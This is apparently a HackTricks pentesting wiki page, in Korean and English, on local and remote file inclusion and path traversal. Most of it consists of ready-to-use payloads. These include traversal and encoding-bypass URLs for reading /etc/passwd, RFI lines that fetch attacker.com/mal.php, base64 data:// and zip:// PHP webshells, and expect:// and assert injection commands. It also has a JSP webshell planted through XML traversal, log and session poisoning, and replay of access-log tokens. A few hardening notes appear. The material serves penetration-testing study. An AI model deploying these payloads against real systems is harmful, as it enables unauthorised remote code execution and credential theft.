# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 파일이 원격 서버에서 로드된다 (가장 좋은 경우: 코드를 작성하면 서버가 이를 실행한다). In php this is **비활성화** by default (**allow_url_include**).\
**Local File Inclusion (LFI):** 서버가 로컬 파일을 로드한다.

이 취약점은 사용자가 서버가 로드할 파일을 어떤 식으로든 제어할 수 있을 때 발생한다.

취약한 **PHP 함수**: require, require_once, include, include_once

이 취약점을 악용하는 데 유용한 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 *nix LFI 리스트를 합치고 경로를 더 추가해서 제가 만든 목록:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

또한 `/` 를 `\`\\
또한 `../../../../../` 를 추가해 보세요

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

여러 wordlists의 병합:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

또한 `/` 를 `\`\\
또한 `C:/` 를 제거하고 `../../../../../` 를 추가해 보세요

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

linux의 LFI 리스트를 확인하세요.

## Basic LFI and bypasses

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences 비재귀적으로 제거됨
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

제공된 문자열 끝에 문자를 더 추가하는 동작을 Bypass (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이 문제는 **PHP 5.4부터 해결되었습니다**

### **인코딩**

비표준 인코딩(예: double URL encode 및 기타)을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 기존 폴더에서

아마도 back-end가 폴더 경로를 검사하고 있을 수 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 서버의 파일 시스템 디렉터리 탐색

서버의 파일 시스템은 특정 기법을 사용해 파일뿐만 아니라 디렉터리도 재귀적으로 탐색할 수 있다. 이 과정은 현재 디렉터리의 깊이를 파악하고 특정 폴더의 존재를 조회하는 것을 포함한다. 아래에 이를 달성하기 위한 상세한 방법을 제시한다:

1. **디렉터리 깊이 결정:** 서버가 Linux 기반인 경우 `/etc/passwd` 파일을 성공적으로 가져와 현재 디렉터리의 깊이를 확인한다. 예시 URL은 다음과 같이 구성될 수 있으며, 이는 깊이 3을 나타낸다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **폴더 조사:** 의심되는 폴더 이름(예: `private`)을 URL에 추가한 다음 `/etc/passwd`로 다시 이동합니다. 추가된 디렉터리 레벨로 인해 depth를 하나 증가시켜야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **결과 해석:** 서버의 응답은 해당 폴더의 존재 여부를 알려줍니다:
- **오류 / 출력 없음:** 해당 위치에 `private` 폴더가 없을 가능성이 높습니다.
- **`/etc/passwd`의 내용:** `private` 폴더의 존재가 확인됩니다.
4. **재귀적 탐색:** 발견된 폴더는 동일한 기법이나 전통적인 Local File Inclusion (LFI) 방법을 사용해 하위 디렉터리나 파일을 추가로 조사할 수 있습니다.

파일 시스템의 다른 위치를 탐색하려면 payload를 적절히 조정하세요. 예를 들어, 현재 디렉터리가 깊이 3에 있다고 가정할 때 `/var/www/`에 `private` 디렉터리가 있는지 확인하려면 다음을 사용하세요:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation은 웹 애플리케이션에서 파일 경로를 조작하기 위해 사용되는 방법입니다. 이 기법은 파일 경로 끝에 추가 문자를 덧붙여 차단하는 일부 보안 조치를 우회하여 접근이 제한된 파일에 접근하는 데 자주 사용됩니다. 목적은 보안 조치에 의해 변경된 후에도 여전히 원하는 파일을 가리키는 파일 경로를 만드는 것입니다.

In PHP에서는 파일 시스템 특성 때문에 여러 가지 파일 경로 표기법이 동일한 경로로 처리될 수 있습니다. 예를 들어:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
- Similarly, if `.php` is appended to a file path (like `shellcode.php`), adding a `/.` at the end will not alter the file being accessed.

다음 예제들은 민감한 내용(사용자 계정 정보) 때문에 흔히 목표가 되는 `/etc/passwd`에 접근하기 위해 path truncation을 활용하는 방법을 보여줍니다:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
이러한 시나리오에서는 필요한 traversals 수가 대략 2027개에 달할 수 있지만, 이 수치는 서버 구성에 따라 달라질 수 있습니다.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`)와 추가적인 dot segments 및 문자를 결합하면 파일 시스템을 탐색할 수 있으며, 서버가 덧붙인 문자열을 사실상 무시하게 만들 수 있습니다.
- **Determining the Required Number of Traversals**: 시행착오를 통해 루트 디렉터리로 이동한 다음 `/etc/passwd`로 가기 위해 필요한 정확한 `../` 시퀀스 수를 찾을 수 있으며, 이 과정에서 `.php`와 같은 덧붙인 문자열을 무효화하면서 원하는 경로(`/etc/passwd`)는 그대로 유지되도록 할 수 있습니다.
- **Starting with a Fake Directory**: 경로를 존재하지 않는 디렉터리(예: `a/`)로 시작하는 것은 흔한 관행입니다. 이 방법은 예방적 조치로 사용되거나 서버의 경로 파싱 로직 요구사항을 충족시키기 위해 사용됩니다.

path truncation techniques을 사용할 때는 서버의 경로 파싱 동작과 파일 시스템 구조를 이해하는 것이 중요합니다. 각 시나리오마다 다른 접근법이 필요할 수 있으며, 가장 효과적인 방법을 찾기 위해 테스트가 종종 필요합니다.

**이 취약점은 PHP 5.3에서 수정되었습니다.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php에서는 기본적으로 이 기능이 비활성화되어 있습니다. 그 이유는 **`allow_url_include`**가 **Off.**이기 때문입니다. 작동시키려면 **On**으로 설정해야 하며, 그 경우 서버에서 PHP 파일을 포함해서 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
어떤 이유로 **`allow_url_include`**가 **On**인데 PHP가 외부 웹페이지 접근을 **filtering**하는 경우, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), 예를 들어 data protocol과 base64를 사용해 b64 PHP 코드를 디코드하고 egt RCE를 얻을 수 있습니다:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 이전 코드에서, 마지막 `+.txt`는 공격자가 `.txt`로 끝나는 문자열을 필요로 했기 때문에 추가되었습니다. 그래서 문자열은 `.txt`로 끝나고 b64 decode 후 그 부분은 단지 쓸모없는 데이터(junk)를 반환하며 실제 PHP 코드는 포함(따라서 실행)됩니다.
>
> 다른 예시로 **`php://` 프로토콜을 사용하지 않는** 경우는 다음과 같습니다:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 루트 요소

python에서 다음과 같은 코드가 있을 때:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 **absolute path**를 **`file_name`**에 전달하면, **이전 경로는 단순히 제거됩니다**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
이는 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> 컴포넌트가 절대 경로인 경우, 이전의 모든 컴포넌트는 버려지고 결합은 절대 경로 컴포넌트에서 계속 진행됩니다.

## Java 디렉터리 목록

보아하니 Java에서 Path Traversal이 있을 때 파일 대신 **디렉터리를 요청하면**, **해당 디렉터리의 목록이 반환되는** 것으로 보입니다. 제가 알기로 다른 언어에서는 이런 일이 발생하지 않습니다.

## 상위 25개 파라미터

다음은 local file inclusion (LFI) 취약점에 노출될 수 있는 상위 25개 파라미터 목록입니다 (출처: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI - PHP wrappers 및 프로토콜 사용

### php://filter

PHP filters는 데이터가 읽히거나 써지기 전에 기본적인 **데이터 수정 작업**을 수행할 수 있게 해줍니다. 필터는 5가지 범주로 나뉩니다:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 데이터에서 태그를 제거합니다( "<"와 ">" 문자 사이의 모든 것).
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 다른 인코딩으로 변환합니다(`convert.iconv.<input_enc>.<output_enc>`). 지원되는 **모든 인코딩 목록**을 얻으려면 콘솔에서 `iconv -l`을 실행하세요.

> [!WARNING]
> convert.iconv.* 변환 필터를 악용하면 **임의의 텍스트를 생성할 수** 있으며, 이는 임의 텍스트를 작성하거나 include 같은 함수가 임의 텍스트를 처리하도록 만드는 데 유용할 수 있습니다. 자세한 내용은 [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)를 확인하세요.

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 콘텐츠를 압축합니다 (많은 정보를 exfiltrating할 때 유용)
- `zlib.inflate`: 데이터를 압축 해제합니다
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 사용 중단됨
- `mdecrypt.*` : 사용 중단됨
- Other Filters
- php에서 `var_dump(stream_get_filters());`를 실행하면 몇 가지 **예상치 못한 필터들**을 찾을 수 있습니다:
- `consumed`
- `dechunk`: HTTP chunked 인코딩을 역변환합니다
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> 해당 부분 "php://filter"는 대소문자를 구분하지 않습니다

### php filters를 oracle로 사용하여 임의의 파일 읽기

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)에서는 서버로부터 출력이 직접 반환되지 않아도 로컬 파일을 읽는 기술을 제안합니다. 이 기술은 **boolean exfiltration of the file (char by char) using php filters**을 oracle로 사용하는 방식에 기반합니다. 이는 php filters가 텍스트를 충분히 크게 만들어 php가 예외를 던지게 할 수 있기 때문입니다.

원문 포스트에서 기술에 대한 자세한 설명을 확인할 수 있지만, 여기서는 간단한 요약을 제공합니다:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beggining of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

포스트에서는 이 과정을 자동화하는 도구도 공개되었습니다: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

이 래퍼는 프로세스가 열어 둔 file descriptors에 접근할 수 있게 해줍니다. 열린 파일의 내용을 exfiltrate하는 데 잠재적으로 유용합니다:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (이것이 공격에 어떻게 유용할지는 잘 모르겠습니다)

### zip:// and rar://

내부에 PHPShell이 들어있는 Zip 또는 Rar 파일을 업로드하고 접근하세요.\
rar protocol을 악용하려면 해당 프로토콜을 **명시적으로 활성화해야 합니다**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 설정 **`allow_url_open`** 및 **`allow_url_include`**에 의해 제한된다는 점에 유의하세요.

### expect://

Expect가 활성화되어 있어야 합니다. 다음을 사용해 코드를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

payload를 POST parameters에 지정하세요:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

웹 애플리케이션이 파일 로드를 위해 `include`와 같은 함수를 사용할 때 `.phar` 파일을 이용해 PHP 코드를 실행할 수 있습니다. 아래의 PHP 코드 스니펫은 `.phar` 파일을 생성하는 예시를 보여줍니다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면 다음 명령을 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
실행하면 `test.phar`라는 파일이 생성되며, 이는 Local File Inclusion (LFI) 취약점을 악용하는 데 활용될 수 있습니다.

LFI가 내부 PHP 코드를 실행하지 않고 `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, 또는 `filesize()` 같은 함수들을 통해 파일을 단순히 읽는 경우, deserialization vulnerability를 시도할 수 있습니다. 이 취약점은 `phar` 프로토콜을 통한 파일 읽기와 관련되어 있습니다.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

php filters를 지원하는 PHP에서의 파일 읽기(**any arbitrary file read from PHP that supports php filters**)를 악용해 RCE를 얻을 수 있었습니다. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\ 간단 요약: PHP 힙의 **3 byte overflow**가 악용되어 특정 크기의 free chunks 체인을 **alter the chain of free chunks**하도록 조작했고, 이를 통해 임의의 주소에 **write anything in any address**할 수 있게 되어 **`system`**을 호출하는 훅이 추가되었습니다.\ 추가로 더 많은 php filters를 이용해 특정 크기의 청크를 alloc하는 것이 가능했습니다.

### More protocols

다음에서 더 많은[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**를 확인하세요

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 쓰기 (file inclusion attack에서 어떻게 유용할지는 불확실함)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일시스템 접근
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 압축 스트림
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴과 일치하는 경로명 찾기 (출력 가능한 내용을 반환하지 않으므로 여기서는 별로 유용하지 않음)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림 (임의 파일 읽기에 유용하지 않음)

## LFI via PHP's 'assert'

PHP에서 'assert' 함수를 다룰 때 Local File Inclusion (LFI) 위험이 특히 큽니다. 'assert'는 문자열 내의 코드를 실행할 수 있기 때문입니다. 특히 ".." 같은 디렉터리 트래버설 문자가 포함된 입력을 검사만 하고 제대로 정제하지 않을 때 문제가 됩니다.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이는 traversal을 차단하려는 의도이지만, 의도치 않게 code injection을 위한 벡터를 생성합니다. reading file contents을 악용하려면, attacker는 다음을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
마찬가지로, 임의의 시스템 명령을 실행하기 위해 다음을 사용할 수 있습니다:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> 이 기법은 당신이 **file path**을 제어하고, **PHP function**이 파일에 접근하지만 파일의 내용을 볼 수 없는 경우(예: 단순한 호출인 **`file()`**)에 관련이 있습니다. 그러나 파일 내용이 표시되지 않는 경우입니다.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

요약하면, 이 기법은 **"UCS-4LE" encoding**을 사용해 파일의 내용을 매우 크게 만들어 PHP가 파일을 열 때 **error**를 유발하게 합니다.

그 후 첫 글자를 leak하기 위해 필터 `dechunk`를 `base64`나 `rot13` 같은 다른 필터들과 함께 사용하고, 마지막으로 필터들인 **convert.iconv.UCS-4.UCS-4LE**와 **convert.iconv.UTF16.UTF-16BE**를 사용해 다른 문자들을 맨 앞에 배치하여 leak합니다.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- 정규화된 경로(canonical path)로 해석하고 허용 목록(allow-listed)에 있는 기준 디렉터리의 하위 경로인지 강제한다.
- 경로에 `..`, 절대 루트, 또는 드라이브 문자가 포함된 경우 거부한다; 생성된 파일 이름을 선호한다.
- writer를 권한이 낮은 계정으로 실행하고, 쓰기 디렉터리를 서비스되는 루트와 분리한다.

## Remote File Inclusion

앞에서 설명했습니다, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Apache 또는 Nginx 서버가 include 함수 내부에서 **LFI에 취약**한 경우, **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**에 접근해 **user agent**나 **GET parameter**에 php shell(예: **`<?php system($_GET['c']); ?>`**)을 넣고 해당 파일을 include 해볼 수 있다.

> [!WARNING]
> 참고로 쉘에 **double quotes**를 사용하고 **simple quotes** 대신 사용할 경우, 큰따옴표는 문자열 "_**quote;**_"로 변경되어 그 지점에서 **PHP가 에러를 발생시키며** 다른 동작은 **실행되지 않는다**.
>
> 또한 **payload를 정확히 작성**해야 한다. 그렇지 않으면 로그 파일을 로드할 때마다 PHP에서 에러가 발생하며 두 번째 기회를 얻지 못할 것이다.

다른 로그에서도 동일하게 시도할 수 있지만 **주의하라**: 로그 내부의 코드가 URL 인코딩되어 있어 Shell이 무력화될 수 있다. 헤더 **authorisation "basic"**은 Base64로 인코딩된 "user:password"를 포함하며 로그에서 디코드된다. PHPShell은 이 헤더 안에 삽입할 수 있다.\
다른 가능한 로그 경로:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 접근 로그를 읽어 GET-based auth tokens (token replay) 수집

많은 앱이 실수로 GET을 통해 session/auth tokens를 허용합니다(예: AuthenticationToken, token, sid). path traversal/LFI primitive로 웹 서버 로그에 접근할 수 있다면 access logs에서 해당 토큰을 훔쳐 replay하여 authentication을 완전히 우회할 수 있습니다.

How-to:
- Use the traversal/LFI to read the web server access log. Common locations:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Some endpoints return file reads Base64-encoded. If so, decode locally and inspect the log lines.
- Grep for GET requests that include a token parameter and capture its value, then replay it against the application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
본문이 Base64로 인코딩되어 있으면 디코드한 다음, 캡처한 token을 재전송하세요:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
노트:
- URLs에 있는 Tokens는 기본적으로 로그에 기록됩니다; production systems에서 GET을 통해 bearer tokens를 절대 받아들이지 마세요.
- 앱이 여러 token 이름을 지원한다면, AuthenticationToken, token, sid, access_token 같은 일반적인 키를 찾아보세요.
- logs에 leaked되었을 가능성이 있는 tokens는 회전시키세요.

### 이메일을 통해

**Send a mail**을 내부 계정 (user@localhost)으로 보내 PHP payload(예: `<?php echo system($_REQUEST["cmd"]); ?>`)를 포함시키고, 사용자 메일을 다음 경로 중 하나로 include 해보세요: **`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\*를 통한 방법

1. 많은 shells를 업로드하세요 (예: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)를 include 하세요. 여기서 $PID는 프로세스의 PID(무차별 대입으로 찾을 수 있음), $FD는 파일 디스크립터(역시 무차별 대입으로 찾을 수 있음)입니다.

### /proc/self/environ를 통한 방법

로그 파일과 마찬가지로, User-Agent에 payload를 넣어 전송하면 /proc/self/environ 파일에 반영됩니다.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

파일을 업로드할 수 있다면, 그냥 그 안에 shell payload를 주입하세요 (예: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 읽기 쉽게 유지하려면 pictures/doc/pdf의 메타데이터에 주입하는 것이 가장 좋습니다

### Zip 파일 업로드를 통해

PHP shell이 압축된 ZIP 파일을 업로드하고 접근:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions를 통해

웹사이트가 PHP Session (PHPSESSID)을 사용하는지 확인하세요
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서는 이러한 세션이 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일에 저장됩니다
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
쿠키를 `<?php system('cat /etc/passwd');?>`로 설정하세요
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI를 사용하여 PHP 세션 파일을 포함하세요.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh를 통해

ssh가 활성화되어 있다면 (/proc/self/status & /etc/passwd)를 확인해 어떤 사용자가 사용되고 있는지 파악하고 **\<HOME>/.ssh/id_rsa**에 접근해 보세요.

